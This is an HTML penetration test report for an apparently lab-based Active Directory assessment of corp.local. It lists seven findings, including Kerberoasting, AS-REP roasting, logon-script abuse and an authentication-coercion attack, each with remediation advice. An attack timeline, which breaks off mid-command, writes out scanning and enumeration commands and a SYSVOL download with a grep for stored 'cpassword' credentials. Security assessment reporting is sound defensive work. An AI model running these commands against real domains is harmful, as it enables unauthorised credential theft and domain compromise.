@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Agent-Run — AdStrike Report</title>
+  <style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+  background: #f0f2f5;
+  color: #1a1a2e;
+  font-size: 14px;
+  line-height: 1.6;
+}
+a { color: #2980b9; text-decoration: none; }
+a:hover { text-decoration: underline; }
+
+/* ── Header ── */
+.report-header {
+  background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+  color: #fff;
+  padding: 48px 56px 36px;
+  border-bottom: 4px solid #e74c3c;
+}
+.report-header h1 { font-size: 2.2em; font-weight: 700; letter-spacing: -0.5px; }
+.report-header .subtitle { color: #a0aec0; margin-top: 6px; font-size: 0.95em; }
+.header-meta {
+  display: flex; gap: 32px; flex-wrap: wrap;
+  margin-top: 24px; color: #cbd5e0; font-size: 0.88em;
+}
+.header-meta span strong { color: #fff; }
+
+/* ── Risk badge ── */
+.risk-badge {
+  display: inline-flex; flex-direction: column; align-items: center;
+  background: rgba(255,255,255,0.08);
+  border: 1px solid rgba(255,255,255,0.15);
+  border-radius: 12px; padding: 16px 28px;
+  margin-left: auto;
+}
+.risk-badge .risk-score { font-size: 3em; font-weight: 800; line-height: 1; }
+.risk-badge .risk-label { font-size: 0.8em; letter-spacing: 1px; text-transform: uppercase; margin-top: 4px; }
+
+/* ── Layout ── */
+.container { max-width: 1280px; margin: 0 auto; padding: 36px 40px; }
+.section { background: #fff; border-radius: 10px; box-shadow: 0 1px 4px rgba(0,0,0,.08); padding: 28px 32px; margin-bottom: 28px; }
+.section-title {
+  font-size: 1.15em; font-weight: 700; color: #1a1a2e;
+  border-bottom: 2px solid #e74c3c;
+  padding-bottom: 10px; margin-bottom: 20px;
+  display: flex; align-items: center; gap: 10px;
+}
+.section-title .icon { font-size: 1.1em; }
+
+/* ── Stat grid ── */
+.stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(110px, 1fr)); gap: 14px; margin-bottom: 24px; }
+.stat-card {
+  background: #f8f9fa; border-radius: 8px;
+  padding: 18px 12px; text-align: center;
+  border-top: 3px solid #ddd;
+}
+.stat-card .stat-num { font-size: 2.2em; font-weight: 800; line-height: 1; }
+.stat-card .stat-lbl { font-size: 0.78em; color: #666; margin-top: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
+
+/* ── Severity badge ── */
+.sev-badge {
+  display: inline-block; padding: 2px 10px; border-radius: 20px;
+  font-size: 0.78em; font-weight: 700; text-transform: uppercase;
+  letter-spacing: 0.5px; color: #fff;
+}
+
+/* ── MITRE pill ── */
+.mitre-pill {
+  display: inline-block; padding: 2px 8px; border-radius: 4px;
+  font-size: 0.75em; font-weight: 600;
+  background: #eef2ff; color: #3730a3;
+  border: 1px solid #c7d2fe; margin: 1px 2px;
+  font-family: 'Courier New', monospace;
+  cursor: default;
+}
+.mitre-pill:hover { background: #3730a3; color: #fff; }
+
+/* ── CVSS badge ── */
+.cvss-badge {
+  display: inline-block; padding: 3px 10px; border-radius: 4px;
+  font-size: 0.8em; font-weight: 700; border: 1px solid;
+}
+
+/* ── Finding card ── */
+.finding-card {
+  border: 1px solid #e5e7eb; border-radius: 8px;
+  margin-bottom: 18px; overflow: hidden;
+}
+.finding-header {
+  display: flex; align-items: center; gap: 12px;
+  padding: 14px 20px;
+  border-bottom: 1px solid #e5e7eb;
+}
+.finding-id { font-size: 0.85em; font-weight: 700; color: #6b7280; min-width: 28px; }
+.finding-name { font-weight: 700; font-size: 1.05em; flex: 1; }
+.finding-body { padding: 18px 20px; }
+.finding-body table { width: 100%; border-collapse: collapse; }
+.finding-body td { padding: 8px 12px; vertical-align: top; border-bottom: 1px solid #f3f4f6; }
+.finding-body td:first-child { font-weight: 600; color: #4b5563; width: 160px; white-space: nowrap; }
+.finding-body tr:last-child td { border-bottom: none; }
+
+/* ── ATT&CK Coverage ── */
+.tactic-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 12px; }
+.tactic-card {
+  border-radius: 8px; padding: 14px 16px;
+  border: 1px solid #e5e7eb;
+  position: relative; overflow: hidden;
+}
+.tactic-card.covered { border-left: 4px solid; }
+.tactic-card .tactic-name { font-weight: 700; font-size: 0.9em; margin-bottom: 4px; }
+.tactic-card .tactic-count { font-size: 0.8em; color: #6b7280; }
+.tactic-card .tactic-badge {
+  position: absolute; top: 8px; right: 10px;
+  font-size: 0.7em; font-weight: 700; padding: 1px 6px;
+  border-radius: 10px; color: #fff;
+}
+
+/* ── Timeline ── */
+.timeline-table { width: 100%; border-collapse: collapse; font-size: 0.85em; }
+.timeline-table th {
+  background: #1a1a2e; color: #fff;
+  padding: 10px 14px; text-align: left; font-weight: 600;
+}
+.timeline-table td { padding: 8px 14px; border-bottom: 1px solid #f3f4f6; vertical-align: top; }
+.timeline-table tr:nth-child(even) td { background: #f9fafb; }
+.timeline-table .cmd-cell {
+  font-family: 'Courier New', monospace; font-size: 0.88em;
+  color: #1a1a2e; word-break: break-all;
+}
+.timeline-table .time-cell { color: #6b7280; white-space: nowrap; min-width: 160px; }
+
+/* ── Findings overview table ── */
+.overview-table { width: 100%; border-collapse: collapse; }
+.overview-table th {
+  background: #1a1a2e; color: #fff;
+  padding: 10px 14px; text-align: left; font-weight: 600; font-size: 0.88em;
+}
+.overview-table td { padding: 10px 14px; border-bottom: 1px solid #f3f4f6; vertical-align: top; font-size: 0.88em; }
+.overview-table tr:hover td { background: #f9fafb; }
+
+/* ── Footer ── */
+.report-footer {
+  text-align: center; padding: 28px; color: #9ca3af;
+  font-size: 0.82em; border-top: 1px solid #e5e7eb; margin-top: 12px;
+}
+
+/* Print */
+@media print {
+  body { background: #fff; }
+  .section { box-shadow: none; border: 1px solid #e5e7eb; page-break-inside: avoid; }
+  .report-header { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+}
+</style>
+</head>
+<body>
+
+<div class="report-header">
+  <div style="display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:20px">
+    <div>
+      <div style="color:#e74c3c;font-size:0.78em;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px">
+        PENETRATION TEST REPORT — CONFIDENTIAL
+      </div>
+      <h1>Agent-Run</h1>
+      <div class="subtitle">Active Directory Security Assessment</div>
+      <div class="header-meta">
+        <span><strong>Date:</strong> 2026-05-20</span>
+        <span><strong>Tester:</strong> tester</span>
+        <span><strong>Target:</strong> corp.local</span>
+        <span><strong>DC:</strong> 192.168.56.1</span>
+        <span><strong>Generated by:</strong> AdStrike v5.0</span>
+      </div>
+    </div>
+    <div class="risk-badge">
+      <div class="risk-score" style="color:#e74c3c">9.1</div>
+      <div class="risk-label" style="color:#e74c3c">Critical Risk</div>
+      <div style="font-size:0.72em;color:#718096;margin-top:2px">Overall CVSS</div>
+    </div>
+  </div>
+</div>
+
+
+<div class="container">
+
+  <!-- Executive Summary -->
+  <div class="section">
+    <div class="section-title"><span class="icon">📋</span>Executive Summary</div>
+    <div class="stat-grid"><div class="stat-card" style="border-top-color:#e74c3c"><div class="stat-num" style="color:#e74c3c">1</div><div class="stat-lbl">Critical</div></div><div class="stat-card" style="border-top-color:#e67e22"><div class="stat-num" style="color:#e67e22">5</div><div class="stat-lbl">High</div></div><div class="stat-card" style="border-top-color:#f39c12"><div class="stat-num" style="color:#f39c12">0</div><div class="stat-lbl">Medium</div></div><div class="stat-card" style="border-top-color:#27ae60"><div class="stat-num" style="color:#27ae60">0</div><div class="stat-lbl">Low</div></div><div class="stat-card" style="border-top-color:#3498db"><div class="stat-num" style="color:#3498db">1</div><div class="stat-lbl">Info</div></div><div class="stat-card" style="border-top-color:#1a1a2e"><div class="stat-num" style="color:#1a1a2e">7</div><div class="stat-lbl">Total</div></div><div class="stat-card" style="border-top-color:#9b59b6"><div class="stat-num" style="color:#9b59b6">0</div><div class="stat-lbl">Owned Users</div></div><div class="stat-card" style="border-top-color:#16a085"><div class="stat-num" style="color:#16a085">0</div><div class="stat-lbl">Owned Hosts</div></div><div class="stat-card" style="border-top-color:#6b7280"><div class="stat-num" style="color:#6b7280">33</div><div class="stat-lbl">Commands</div></div></div>
+    <p style="line-height:1.8;color:#374151">During the <strong>Agent-Run</strong> engagement, an authorized Active Directory security assessment was conducted against the <strong>corp.local</strong> environment. The assessment identified <strong>7</strong> security finding(s): <span style='color:#e74c3c;font-weight:600'>1 Critical</span>, <span style='color:#e67e22;font-weight:600'>5 High</span>, <span style='color:#3498db;font-weight:600'>1 Info</span>. <strong style='color:#e74c3c'>Critical</strong> findings include <em>Logon Script Abuse Path</em>, representing an immediate risk of full domain compromise. The overall risk rating is <strong style='color:#e74c3c'>Critical (CVSS 9.1)</strong>. Immediate remediation is recommended for all Critical and High findings.</p>
+  </div>
+
+  <!-- ATT&CK Coverage -->
+  <div class="section">
+    <div class="section-title"><span class="icon">🎯</span>MITRE ATT&CK® Coverage</div>
+    <p style="color:#6b7280;font-size:0.88em;margin-bottom:16px">
+      Tactics and techniques observed during this assessment, mapped to the MITRE ATT&CK Enterprise framework.
+      <strong style="color:#3730a3">Blue highlighted</strong> cards indicate a technique was identified in at least one finding.
+    </p>
+    <div class="tactic-grid"><div class="tactic-card " style="background:#f2f8fd;"><span class="tactic-badge" style="background:#d1d5db;color:#6b7280">○</span><div class="tactic-name" style="color:">Reconnaissance</div><div class="tactic-count">Not observed</div></div><div class="tactic-card covered" style="background:#fff;border-left-color:#e74c3c;"><span class="tactic-badge" style="background:#e74c3c">■ 1</span><div class="tactic-name" style="color:#e74c3c">Initial Access</div><div style="margin-top:6px"><span style="font-size:0.75em;color:#6b7280">↳ Forced Authentication</span></div></div><div class="tactic-card " style="background:#f2f8fd;"><span class="tactic-badge" style="background:#d1d5db;color:#6b7280">○</span><div class="tactic-name" style="color:">Execution</div><div class="tactic-count">Not observed</div></div><div class="tactic-card " style="background:#f2f8fd;"><span class="tactic-badge" style="background:#d1d5db;color:#6b7280">○</span><div class="tactic-name" style="color:">Persistence</div><div class="tactic-count">Not observed</div></div><div class="tactic-card " style="background:#f2f8fd;"><span class="tactic-badge" style="background:#d1d5db;color:#6b7280">○</span><div class="tactic-name" style="color:">Privilege Escalation</div><div class="tactic-count">Not observed</div></div><div class="tactic-card " style="background:#f2f8fd;"><span class="tactic-badge" style="background:#d1d5db;color:#6b7280">○</span><div class="tactic-name" style="color:">Defense Evasion</div><div class="tactic-count">Not observed</div></div><div class="tactic-card covered" style="background:#fff;border-left-color:#f39c12;"><span class="tactic-badge" style="background:#f39c12">■ 3</span><div class="tactic-name" style="color:#f39c12">Credential Access</div><div style="margin-top:6px"><span style="font-size:0.75em;color:#6b7280">↳ Unsecured Credentials</span><br><span style="font-size:0.75em;color:#6b7280">↳ Steal/Forge Kerberos Tickets: AS-REP Roast</span><br><span style="font-size:0.75em;color:#6b7280">↳ Steal/Forge Kerberos Tickets: Kerberoasting</span></div></div><div class="tactic-card covered" style="background:#fff;border-left-color:#2980b9;"><span class="tactic-badge" style="background:#2980b9">■ 3</span><div class="tactic-name" style="color:#2980b9">Discovery</div><div style="margin-top:6px"><span style="font-size:0.75em;color:#6b7280">↳ Permission Groups Discovery: Domain Groups</span><br><span style="font-size:0.75em;color:#6b7280">↳ Account Discovery: Domain Account</span><br><span style="font-size:0.75em;color:#6b7280">↳ Domain Trust Discovery</span></div></div><div class="tactic-card " style="background:#f2f8fd;"><span class="tactic-badge" style="background:#d1d5db;color:#6b7280">○</span><div class="tactic-name" style="color:">Lateral Movement</div><div class="tactic-count">Not observed</div></div><div class="tactic-card " style="background:#f2f8fd;"><span class="tactic-badge" style="background:#d1d5db;color:#6b7280">○</span><div class="tactic-name" style="color:">Collection</div><div class="tactic-count">Not observed</div></div><div class="tactic-card " style="background:#f2f8fd;"><span class="tactic-badge" style="background:#d1d5db;color:#6b7280">○</span><div class="tactic-name" style="color:">Command &amp; Control</div><div class="tactic-count">Not observed</div></div><div class="tactic-card " style="background:#f2f8fd;"><span class="tactic-badge" style="background:#d1d5db;color:#6b7280">○</span><div class="tactic-name" style="color:">Impact</div><div class="tactic-count">Not observed</div></div></div>
+  </div>
+
+  <!-- Findings Overview Table -->
+  <div class="section">
+    <div class="section-title"><span class="icon">🔍</span>Findings Overview</div>
+    <table class="overview-table"><tr><th>#</th><th>Finding</th><th>Severity</th><th>CVSS</th><th>MITRE ATT&CK</th></tr><tr style="background:#fdf2f2"><td style="font-weight:700;color:#e74c3c">3</td><td style="font-weight:600">Logon Script Abuse Path</td><td><span class="sev-badge" style="background:#e74c3c">Critical</span></td><td><span class="cvss-badge" style="color:#e74c3c;background:#fdf2f2;border-color:#e74c3c" title="CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H">CVSS 9.1</span></td><td><span class="mitre-pill" title="T1552: Unsecured Credentials">T1552</span></td></tr><tr style="background:#fef9f2"><td style="font-weight:700;color:#e67e22">1</td><td style="font-weight:600">Writable AD Objects</td><td><span class="sev-badge" style="background:#e67e22">High</span></td><td><span class="cvss-badge" style="color:#e67e22;background:#fef9f2;border-color:#e67e22" title="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N">CVSS 7.5</span></td><td><span style="color:#9ca3af;font-size:0.8em">—</span></td></tr><tr style="background:#fef9f2"><td style="font-weight:700;color:#e67e22">2</td><td style="font-weight:600">SYSVOL Logon Script Path Reachable</td><td><span class="sev-badge" style="background:#e67e22">High</span></td><td><span class="cvss-badge" style="color:#e67e22;background:#fef9f2;border-color:#e67e22" title="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N">CVSS 7.5</span></td><td><span class="mitre-pill" title="T1552: Unsecured Credentials">T1552</span></td></tr><tr style="background:#fef9f2"><td style="font-weight:700;color:#e67e22">4</td><td style="font-weight:600">AS-REP Roastable Users</td><td><span class="sev-badge" style="background:#e67e22">High</span></td><td><span class="cvss-badge" style="color:#e67e22;background:#fef9f2;border-color:#e67e22" title="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N">CVSS 7.5</span></td><td><span class="mitre-pill" title="T1558.004: Steal/Forge Kerberos Tickets: AS-REP Roast">T1558.004</span></td></tr><tr style="background:#fef9f2"><td style="font-weight:700;color:#e67e22">5</td><td style="font-weight:600">Kerberoastable Accounts</td><td><span class="sev-badge" style="background:#e67e22">High</span></td><td><span class="cvss-badge" style="color:#f39c12;background:#fefdf2;border-color:#f39c12" title="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N">CVSS 6.5</span></td><td><span class="mitre-pill" title="T1558.003: Steal/Forge Kerberos Tickets: Kerberoasting">T1558.003</span></td></tr><tr style="background:#fef9f2"><td style="font-weight:700;color:#e67e22">7</td><td style="font-weight:600">Coercion Attack Attempted</td><td><span class="sev-badge" style="background:#e67e22">High</span></td><td><span class="cvss-badge" style="color:#e67e22;background:#fef9f2;border-color:#e67e22" title="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N">CVSS 7.5</span></td><td><span class="mitre-pill" title="T1187: Forced Authentication">T1187</span></td></tr><tr style="background:#f2f8fd"><td style="font-weight:700;color:#3498db">6</td><td style="font-weight:600">BloodHound JSON Collected</td><td><span class="sev-badge" style="background:#3498db">Info</span></td><td><span class="cvss-badge" style="color:#3498db;background:#f2f8fd;border-color:#3498db" title="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N">CVSS 0.0</span></td><td><span class="mitre-pill" title="T1069.002: Permission Groups Discovery: Domain Groups">T1069.002</span><span class="mitre-pill" title="T1087.002: Account Discovery: Domain Account">T1087.002</span><span class="mitre-pill" title="T1482: Domain Trust Discovery">T1482</span></td></tr></table>
+  </div>
+
+  <!-- Detailed Findings -->
+  <div class="section">
+    <div class="section-title"><span class="icon">⚠️</span>Detailed Findings</div>
+    <div class="finding-card" id="finding-3"><div class="finding-header" style="background:#fdf2f2"><span class="finding-id">#3</span><span class="finding-name">Logon Script Abuse Path</span><span class="sev-badge" style="background:#e74c3c">Critical</span><span class="cvss-badge" style="color:#e74c3c;background:#fdf2f2;border-color:#e74c3c" title="CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H">CVSS 9.1</span></div><div class="finding-body"><table>
+        <tr>
+          <td>Severity</td>
+          <td><span class="sev-badge" style="background:#e74c3c">Critical</span></td>
+        </tr>
+        <tr>
+          <td>CVSS v3.1</td>
+          <td><span class="cvss-badge" style="color:#e74c3c;background:#fdf2f2;border-color:#e74c3c" title="CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H">CVSS 9.1</span>
+            <span style="font-family:monospace;font-size:0.78em;color:#6b7280;margin-left:8px">CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H</span>
+          </td>
+        </tr>
+        <tr>
+          <td>MITRE ATT&CK</td>
+          <td><a class="mitre-pill" href="https://attack.mitre.org/techniques/T1552/" target="_blank" title="Unsecured Credentials | Credential Access">T1552</a><span style="font-size:0.8em;color:#4b5563;margin-right:10px"> Unsecured Credentials</span></td>
+        </tr>
+        <tr>
+          <td>Description</td>
+          <td>Writable user IT-Admins can be pointed at SYSVOL logon script adstrike_6dba25cf.bat</td>
+        </tr>
+        <tr>
+          <td>Recommendation</td>
+          <td>Remove write rights on user scriptPath and restrict SYSVOL script writes</td>
+        </tr>
+        <tr><td>Timestamp</td><td style="color:#9ca3af;font-size:0.82em">2026-05-20 01:33:48.686895</td></tr></table></div></div>
+<div class="finding-card" id="finding-1"><div class="finding-header" style="background:#fef9f2"><span class="finding-id">#1</span><span class="finding-name">Writable AD Objects</span><span class="sev-badge" style="background:#e67e22">High</span><span class="cvss-badge" style="color:#e67e22;background:#fef9f2;border-color:#e67e22" title="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N">CVSS 7.5</span></div><div class="finding-body"><table>
+        <tr>
+          <td>Severity</td>
+          <td><span class="sev-badge" style="background:#e67e22">High</span></td>
+        </tr>
+        <tr>
+          <td>CVSS v3.1</td>
+          <td><span class="cvss-badge" style="color:#e67e22;background:#fef9f2;border-color:#e67e22" title="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N">CVSS 7.5</span>
+            <span style="font-family:monospace;font-size:0.78em;color:#6b7280;margin-left:8px">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N</span>
+          </td>
+        </tr>
+        <tr>
+          <td>MITRE ATT&CK</td>
+          <td><span style="color:#9ca3af">—</span></td>
+        </tr>
+        <tr>
+          <td>Description</td>
+          <td>bloodyAD get writable found modifiable AD objects; evaluate the matching abuse primitive</td>
+        </tr>
+        <tr>
+          <td>Recommendation</td>
+          <td>Remove unnecessary GenericWrite/WriteProperty from non-admin users</td>
+        </tr>
+        <tr><td>Timestamp</td><td style="color:#9ca3af;font-size:0.82em">2026-05-20 01:33:47.759295</td></tr></table></div></div>
+<div class="finding-card" id="finding-2"><div class="finding-header" style="background:#fef9f2"><span class="finding-id">#2</span><span class="finding-name">SYSVOL Logon Script Path Reachable</span><span class="sev-badge" style="background:#e67e22">High</span><span class="cvss-badge" style="color:#e67e22;background:#fef9f2;border-color:#e67e22" title="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N">CVSS 7.5</span></div><div class="finding-body"><table>
+        <tr>
+          <td>Severity</td>
+          <td><span class="sev-badge" style="background:#e67e22">High</span></td>
+        </tr>
+        <tr>
+          <td>CVSS v3.1</td>
+          <td><span class="cvss-badge" style="color:#e67e22;background:#fef9f2;border-color:#e67e22" title="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N">CVSS 7.5</span>
+            <span style="font-family:monospace;font-size:0.78em;color:#6b7280;margin-left:8px">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N</span>
+          </td>
+        </tr>
+        <tr>
+          <td>MITRE ATT&CK</td>
+          <td><a class="mitre-pill" href="https://attack.mitre.org/techniques/T1552/" target="_blank" title="Unsecured Credentials | Credential Access">T1552</a><span style="font-size:0.8em;color:#4b5563;margin-right:10px"> Unsecured Credentials</span></td>
+        </tr>
+        <tr>
+          <td>Description</td>
+          <td>tester can browse SYSVOL scripts; combine writable user object with scriptPath</td>
+        </tr>
+        <tr>
+          <td>Recommendation</td>
+          <td>Restrict SYSVOL script write access and monitor scriptPath changes</td>
+        </tr>
+        <tr><td>Timestamp</td><td style="color:#9ca3af;font-size:0.82em">2026-05-20 01:33:47.806285</td></tr></table></div></div>
+<div class="finding-card" id="finding-4"><div class="finding-header" style="background:#fef9f2"><span class="finding-id">#4</span><span class="finding-name">AS-REP Roastable Users</span><span class="sev-badge" style="background:#e67e22">High</span><span class="cvss-badge" style="color:#e67e22;background:#fef9f2;border-color:#e67e22" title="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N">CVSS 7.5</span></div><div class="finding-body"><table>
+        <tr>
+          <td>Severity</td>
+          <td><span class="sev-badge" style="background:#e67e22">High</span></td>
+        </tr>
+        <tr>
+          <td>CVSS v3.1</td>
+          <td><span class="cvss-badge" style="color:#e67e22;background:#fef9f2;border-color:#e67e22" title="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N">CVSS 7.5</span>
+            <span style="font-family:monospace;font-size:0.78em;color:#6b7280;margin-left:8px">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</span>
+          </td>
+        </tr>
+        <tr>
+          <td>MITRE ATT&CK</td>
+          <td><a class="mitre-pill" href="https://attack.mitre.org/techniques/T1558/004/" target="_blank" title="Steal/Forge Kerberos Tickets: AS-REP Roast | Credential Access">T1558.004</a><span style="font-size:0.8em;color:#4b5563;margin-right:10px"> Steal/Forge Kerberos Tickets: AS-REP Roast</span></td>
+        </tr>
+        <tr>
+          <td>Description</td>
+          <td>2 accounts without Kerberos pre-auth</td>
+        </tr>
+        <tr>
+          <td>Recommendation</td>
+          <td>Enable Kerberos pre-authentication for all accounts</td>
+        </tr>
+        <tr><td>Timestamp</td><td style="color:#9ca3af;font-size:0.82em">2026-05-20 01:33:54.169299</td></tr></table></div></div>
+<div class="finding-card" id="finding-5"><div class="finding-header" style="background:#fef9f2"><span class="finding-id">#5</span><span class="finding-name">Kerberoastable Accounts</span><span class="sev-badge" style="background:#e67e22">High</span><span class="cvss-badge" style="color:#f39c12;background:#fefdf2;border-color:#f39c12" title="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N">CVSS 6.5</span></div><div class="finding-body"><table>
+        <tr>
+          <td>Severity</td>
+          <td><span class="sev-badge" style="background:#e67e22">High</span></td>
+        </tr>
+        <tr>
+          <td>CVSS v3.1</td>
+          <td><span class="cvss-badge" style="color:#f39c12;background:#fefdf2;border-color:#f39c12" title="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N">CVSS 6.5</span>
+            <span style="font-family:monospace;font-size:0.78em;color:#6b7280;margin-left:8px">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</span>
+          </td>
+        </tr>
+        <tr>
+          <td>MITRE ATT&CK</td>
+          <td><a class="mitre-pill" href="https://attack.mitre.org/techniques/T1558/003/" target="_blank" title="Steal/Forge Kerberos Tickets: Kerberoasting | Credential Access">T1558.003</a><span style="font-size:0.8em;color:#4b5563;margin-right:10px"> Steal/Forge Kerberos Tickets: Kerberoasting</span></td>
+        </tr>
+        <tr>
+          <td>Description</td>
+          <td>4 service accounts with SPNs</td>
+        </tr>
+        <tr>
+          <td>Recommendation</td>
+          <td>Use gMSA; set 25+ char passwords on service accounts</td>
+        </tr>
+        <tr><td>Timestamp</td><td style="color:#9ca3af;font-size:0.82em">2026-05-20 01:33:57.254558</td></tr></table></div></div>
+<div class="finding-card" id="finding-7"><div class="finding-header" style="background:#fef9f2"><span class="finding-id">#7</span><span class="finding-name">Coercion Attack Attempted</span><span class="sev-badge" style="background:#e67e22">High</span><span class="cvss-badge" style="color:#e67e22;background:#fef9f2;border-color:#e67e22" title="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N">CVSS 7.5</span></div><div class="finding-body"><table>
+        <tr>
+          <td>Severity</td>
+          <td><span class="sev-badge" style="background:#e67e22">High</span></td>
+        </tr>
+        <tr>
+          <td>CVSS v3.1</td>
+          <td><span class="cvss-badge" style="color:#e67e22;background:#fef9f2;border-color:#e67e22" title="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N">CVSS 7.5</span>
+            <span style="font-family:monospace;font-size:0.78em;color:#6b7280;margin-left:8px">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N</span>
+          </td>
+        </tr>
+        <tr>
+          <td>MITRE ATT&CK</td>
+          <td><a class="mitre-pill" href="https://attack.mitre.org/techniques/T1187/" target="_blank" title="Forced Authentication | Initial Access">T1187</a><span style="font-size:0.8em;color:#4b5563;margin-right:10px"> Forced Authentication</span></td>
+        </tr>
+        <tr>
+          <td>Description</td>
+          <td>Forced dc01.corp.local to authenticate to 192.168.56.100 — capture Net-NTLMv2 or relay</td>
+        </tr>
+        <tr>
+          <td>Recommendation</td>
+          <td>Enable EPA; disable WebClient service; block outbound SMB 445</td>
+        </tr>
+        <tr><td>Timestamp</td><td style="color:#9ca3af;font-size:0.82em">2026-05-20 01:36:54.739548</td></tr></table></div></div>
+<div class="finding-card" id="finding-6"><div class="finding-header" style="background:#f2f8fd"><span class="finding-id">#6</span><span class="finding-name">BloodHound JSON Collected</span><span class="sev-badge" style="background:#3498db">Info</span><span class="cvss-badge" style="color:#3498db;background:#f2f8fd;border-color:#3498db" title="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N">CVSS 0.0</span></div><div class="finding-body"><table>
+        <tr>
+          <td>Severity</td>
+          <td><span class="sev-badge" style="background:#3498db">Info</span></td>
+        </tr>
+        <tr>
+          <td>CVSS v3.1</td>
+          <td><span class="cvss-badge" style="color:#3498db;background:#f2f8fd;border-color:#3498db" title="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N">CVSS 0.0</span>
+            <span style="font-family:monospace;font-size:0.78em;color:#6b7280;margin-left:8px">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N</span>
+          </td>
+        </tr>
+        <tr>
+          <td>MITRE ATT&CK</td>
+          <td><a class="mitre-pill" href="https://attack.mitre.org/techniques/T1069/002/" target="_blank" title="Permission Groups Discovery: Domain Groups | Discovery">T1069.002</a><span style="font-size:0.8em;color:#4b5563;margin-right:10px"> Permission Groups Discovery: Domain Groups</span><br><a class="mitre-pill" href="https://attack.mitre.org/techniques/T1087/002/" target="_blank" title="Account Discovery: Domain Account | Discovery">T1087.002</a><span style="font-size:0.8em;color:#4b5563;margin-right:10px"> Account Discovery: Domain Account</span><br><a class="mitre-pill" href="https://attack.mitre.org/techniques/T1482/" target="_blank" title="Domain Trust Discovery | Discovery">T1482</a><span style="font-size:0.8em;color:#4b5563;margin-right:10px"> Domain Trust Discovery</span></td>
+        </tr>
+        <tr>
+          <td>Description</td>
+          <td>BloodHound JSON files collected without zip archive.</td>
+        </tr>
+        <tr>
+          <td>Recommendation</td>
+          <td>Import JSON files into BloodHound or zip them manually.</td>
+        </tr>
+        <tr><td>Timestamp</td><td style="color:#9ca3af;font-size:0.82em">2026-05-20 01:34:02.816767</td></tr></table></div></div>
+  </div>
+
+  <!-- Owned Assets -->
+  <div class="section">
+    <div class="section-title"><span class="icon">🔑</span>Compromised Assets</div>
+    <p style="color:#9ca3af;font-style:italic">No owned assets recorded.</p>
+  </div>
+
+  <!-- Attack Timeline -->
+  <div class="section">
+    <div class="section-title"><span class="icon">📅</span>Attack Timeline</div>
+    <p style="font-size:0.82em;color:#6b7280;margin-bottom:12px">Attack timeline (33 total)</p><table class="timeline-table"><tr><th>Time</th><th>Command</th></tr><tr><td class="time-cell">2026-05-20 01:33:09</td><td class="cmd-cell">nmap -sV --version-intensity 0 -p 53,80,88,135,139,389,443,445,464,593,636,1433,3268,3269,3389,5985,5986,8080,8443,8530,8531,9389 --open -T5 --min-rate 5000 192.168.56.1</td></tr><tr><td class="time-cell">2026-05-20 01:33:15</td><td class="cmd-cell">nxc smb 192.168.56.1 2&gt;&amp;1 | grep -i &#x27;NTLM&#x27;</td></tr><tr><td class="time-cell">2026-05-20 01:33:17</td><td class="cmd-cell">nxc ldap 192.168.56.1 -u &#x27;tester&#x27; -p &#x27;***&#x27; -d corp.local --users</td></tr><tr><td class="time-cell">2026-05-20 01:33:19</td><td class="cmd-cell">nxc smb 192.168.56.1 -u &#x27;tester&#x27; -p &#x27;***&#x27; -d corp.local --shares</td></tr><tr><td class="time-cell">2026-05-20 01:33:20</td><td class="cmd-cell">smbclient //192.168.56.1/SYSVOL -U &#x27;corp.local\tester%***&#x27; -c &#x27;recurse ON; prompt OFF; mget *.xml&#x27; 2&gt;/dev/null &amp;&amp; grep -r &#x27;cpassword&#x27; /tmp/agent_loot/ 2&gt;/dev/null | head -10</td></tr><tr><td class="time-cell">2026-05-20 01:33:21</td><td class="cmd-cell">nxc smb 192.168.56.1 -u &#x27;tester&#x27; -p 